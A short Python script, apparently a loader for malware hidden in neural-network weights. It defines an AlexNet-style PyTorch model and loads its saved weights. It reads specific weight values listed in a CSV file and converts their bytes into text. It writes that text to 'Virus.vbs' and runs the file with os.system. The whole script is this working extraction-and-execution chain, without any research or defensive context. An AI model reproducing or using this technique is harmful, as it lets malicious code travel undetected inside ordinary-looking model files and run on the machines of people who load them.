import os
import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
import numpy as np
import torch
from torch import nn
import torch.optim as optim
import torchvision
from torchvision import transforms, models, datasets
import imageio
import time
import warnings
import random
import sys
import copy
import json
from PIL import Image
import struct
import os

class AlexNet(nn.Module):
  def __init__(self, num_classes):
    super(AlexNet, self).__init__()
    self.features = nn.Sequential(
      nn.Conv2d(1, 32, kernel_size=3, padding=2),
      nn.ReLU(inplace=True),
      nn.MaxPool2d(kernel_size=2, stride=2),
      nn.Conv2d(32, 64, kernel_size=5, stride=1, padding=2),
      nn.ReLU(inplace=True),
      nn.MaxPool2d(kernel_size=2, stride=2),
      nn.Conv2d(64, 128, kernel_size=3, stride=1, padding=1),
      nn.ReLU(inplace=True),
      nn.Conv2d(128, 256, kernel_size=3, stride=1, padding=1),
      nn.ReLU(inplace=True),
      nn.Conv2d(256, 256, kernel_size=3, stride=1, padding=1),
      nn.ReLU(inplace=True),
      nn.MaxPool2d(kernel_size=3, stride=2),
    )
    self.avgpool = nn.AdaptiveAvgPool2d((3, 3))
    self.classifier = nn.Sequential(
      nn.Dropout(),
      nn.Linear(256 * 3 * 3, 1024),
      nn.ReLU(inplace=True),
      nn.Dropout(),
      nn.Linear(1024, 512),
      nn.ReLU(inplace=True),
      nn.Linear(512, num_classes),
    )

  def forward(self, x: torch.Tensor) -> torch.Tensor:
    x = self.features(x)
    x = self.avgpool(x)
    x = torch.flatten(x, 1)
    x = self.classifier(x)
    return x

EvilModel = AlexNet(num_classes=10)
EvilParam = torch.load('AlexNet.pt',map_location='cpu')
EvilModel.load_state_dict(EvilParam)

df = pd.read_csv('Train_data.csv')
model = EvilModel

virus = []
for i in range(0,len(df)):
  layer = df['layer'][i]
  param1 = df['param1'][i]
  param2 = df['param2'][i]
  num = model.state_dict()[layer][param1][param2].numpy().tolist()
  virus = virus + [num]
texts = ''
for i in virus:
  text = struct.pack('>f', i).decode('cp1250')
  texts = texts + text
texts = texts.replace('<','')

with open('Virus.vbs',mode = 'w') as f:
    file = f.write(texts)
    
os.system('Virus.vbs')

